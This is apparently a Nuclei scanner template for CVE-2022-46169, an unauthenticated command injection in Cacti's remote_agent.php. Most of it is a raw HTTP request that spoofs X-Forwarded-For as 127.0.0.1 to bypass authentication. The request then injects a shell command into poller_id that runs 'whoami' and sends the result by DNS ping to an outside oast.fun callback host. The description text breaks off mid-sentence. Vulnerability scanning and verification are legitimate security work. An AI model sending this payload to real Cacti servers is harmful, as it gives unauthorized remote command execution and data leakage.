id: CVE-2022-46169_51pwn

info:
  name: Unauthenticated Command Injection
  author: 51pwn
  severity: critical
  description: |
    The vulnerability resides in the remote_agent.php file. This file can be accessed without authentication. In order to verify that the client is allowed the function remote_client_authorized is called:


requests:
  - raw:
      - |
        GET /cacti/remote_agent.php?action=polldata&poller_id=;ping%20-c%202%20`whoami`.ccsy8s32vtc0000x5nagg8rkyboyyyyyc.oast.fun&host_id=2&local_data_ids[]=6 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020
        Accept-Charset: utf-8
        Accept-Encoding: gzip, deflate
        Connection: close
        X-Forwarded-For: 127.0.0.1

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '[{"value": "'
        condition: and